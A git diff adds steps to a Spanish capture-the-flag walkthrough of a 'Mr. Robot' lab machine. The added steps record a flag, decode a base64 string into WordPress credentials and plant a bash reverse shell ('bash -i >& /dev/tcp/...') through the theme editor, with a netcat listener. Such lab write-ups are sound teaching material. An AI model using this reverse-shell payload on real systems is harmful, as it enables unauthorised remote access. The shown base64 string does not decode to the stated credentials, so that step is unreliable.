@@ -1,4 +1,4 @@
-![image](https://github.com/user-attachments/assets/572ba377-41d2-4eab-926d-14731b4d32bb)# Reto 5 - Mr. Robot
+# Reto 5 - Mr. Robot
 Herramientas utilizadas:
 - nmap
 - netcat
@@ -33,4 +33,32 @@ Utilizamos la herramienta ```gobuster``` para listar los directorios existentes 
 
 <p align="center"> <img src="../../img_JCE_UCI2024/reto5-1.png" /> </p>
 
-Listamos el contenido del fichero 
+Listamos el contenido del fichero y encontramos la primera flag del reto
+
+Primera flag: ```flag{073403c8a58a1f80d943455fb30724b9}```
+
+
+Revisando otros directorios encontramos que en ```/license``` se mostraba un mensaje que parecía no muy relevante. Al observar al final de la web, nos mostraban una cadena en base64.
+
+<p align="center"> <img src="../../img_JCE_UCI2024/reto5-1.png" /> </p>
+
+Decodificamos la cadena para llevarla a texto claro y obtenemos un posible usuario y contraseña.
+```
+echo "ZwxsaW90kVSMjgtMDY1Mgo=" | base64 -d
+  elliot:ER28-0652
+```
+Accedemos al panel de login de Wordpress y probamos las credenciales encontradas.
+
+<p align="center"> <img src="../../img_JCE_UCI2024/reto5-1.png" /> </p>
+<p align="center"> <img src="../../img_JCE_UCI2024/reto5-1.png" /> </p>
+
+Ya logueados nos aprovechamos del apartado **Appearance** para subir una **reverse shell** y ganar acceso a la máquina. Agregamos la línea de código siguiente:
+```
+bash -i >& /dev/tcp/10.8.144.236/4142 0>&1
+```
+Posteriormente nos ponemos en escucha en nuestra máquina local con ```netcat``` y accedemos al archivo donde se encuentra el código agregado para ganar acceso a la máquina víctima. ```URL:  http://10.32.2.48/wp-content/themes/twentyfifteen/archive.php```
+```
+nc -nlvp 4142
+```
+
+<p align="center"> <img src="../../img_JCE_UCI2024/reto5-1.png" /> </p>
